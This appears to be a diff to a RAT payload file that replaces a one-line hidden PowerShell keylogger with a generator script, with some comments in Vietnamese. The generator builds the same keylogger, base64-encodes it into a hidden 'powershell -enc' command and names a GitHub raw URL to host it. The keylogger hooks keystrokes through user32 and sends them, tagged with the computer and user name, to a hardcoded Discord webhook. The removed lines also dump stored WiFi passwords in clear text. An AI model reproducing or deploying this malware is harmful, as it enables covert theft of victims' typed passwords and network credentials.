@@ -1,5 +1,17 @@
-# pi.txt - WORKING KEYLOGGER FOR YOUR RAT
-powershell -nop -w hidden -c "$log=`$env:TEMP\keys.log;`$hook='https://discord.com/api/webhooks/1456532032522944669/Vjhe__tyv2859zCJKwPZbgDV5Vyjiozyj3kXTg5JufdC8rL2b__sZeIFr5Ro5iG9XygH';Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class K{public delegate IntPtr HK(int c,IntPtr w,IntPtr l);[DllImport(`\"user32.dll`\")]public static extern IntPtr SWH(int i,HK p,IntPtr m,uint t);[DllImport(`\"user32.dll`\")]public static extern IntPtr CNHE(IntPtr h,int c,IntPtr w,IntPtr l);[DllImport(`\"kernel32.dll`\")]public static extern IntPtr GMH(string m);public static HK h=HKC;public static IntPtr HKC(int c,IntPtr w,IntPtr l){if(c>=0&&w==(IntPtr)0x100){int vk=Marshal.ReadInt32(l);`$k=[char]vk;`$f=[IO.File]::AppendAllText(`$log,`$k+` `[DateTime]::Now.ToString(`'HH:mm:ss`')+`' `);}}public static void Start(){SWH(13,h,GMH(`\"user32.dll`\"),0);}}';[K]::Start();while(1){`$keys=gc `$log -ErrorAction SilentlyContinue 2>`$null;if(`$keys){`$body=@{content=`"🔑[`$(`$env:COMPUTERNAME\`$env:USERNAME] KEYS: `$(`$keys -join `` `)|select -last 30`} | ConvertTo-Json;(New-Object Net.WebClient).Headers.Add(`'User-Agent`',`"Mozilla/5.0`");(New-Object Net.WebClient).UploadString(`$hook,`'POST`',`$body);ri `$log -Force};sls 2}"
+# Chạy script này để generate pi.txt content
+$keylogger = @"
+# Stealth Keylogger + Discord Exfil (Optimized for RAT)
+`$logfile = "`$env:TEMP\keys.log"; 
+`$webhook = 'https://discord.com/api/webhooks/1456532032522944669/Vjhe__tyv2859zCJKwPZbgDV5Vyjiozyj3kXTg5JufdC8rL2b__sZeIFr5Ro5iG9XygH';
+Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class K{public delegate IntPtr HK(int c,IntPtr w,IntPtr l);[DllImport(`"user32.dll`")]public static extern IntPtr SWH(int i,HK p,IntPtr m,uint t);[DllImport(`"user32.dll`")]public static extern IntPtr CNHE(IntPtr h,int c,IntPtr w,IntPtr l);[DllImport(`"kernel32.dll`")]public static extern IntPtr GMH(string m);public static HK h=HKC;public static IntPtr HKC(int c,IntPtr w,IntPtr l){if(c>=0&&w==(IntPtr)0x100){int vk=Marshal.ReadInt32(l);`$k=(char)vk;`$f=[IO.File]::AppendAllText(`$logfile,`$k);}}public static void Start(){SWH(13,h,GMH(`"user32.dll`"),0);}}';[K]::Start();while(1){`$keys=Get-Content `$logfile -ErrorAction SilentlyContinue;if(`$keys){`$body=@{content="🔑KEYS[`$(`$env:COMPUTERNAME]: `$(`$keys -join ' ')|Select-Object -Last 50} | ConvertTo-Json;(New-Object Net.WebClient).UploadString(`$webhook,'POST',`$body);Remove-Item `$logfile -Force};Start-Sleep 3}
+"@
 
-# Multi-function (Screenshot + WiFi + Keys)
-powershell -c "netsh wlan show profile name=* key=clear | Out-File `$env:TEMP\wifi.txt;(gc `$env:TEMP\wifi.txt)|select -last 20"
+# Encode & Format cho pi.txt
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($keylogger)
+$encoded = [Convert]::ToBase64String($bytes)
+$final_cmd = "powershell.exe -nop -w hidden -enc $encoded"
+
+# Copy vào GitHub pi.txt
+Write-Host "=== PI.TXT CONTENT ===" -ForegroundColor Green
+Write-Host $final_cmd
+Write-Host "`n=== SAVE THIS TO: https://raw.githubusercontent.com/conbobi/df/main/pi.txt ===" -ForegroundColor Yellow
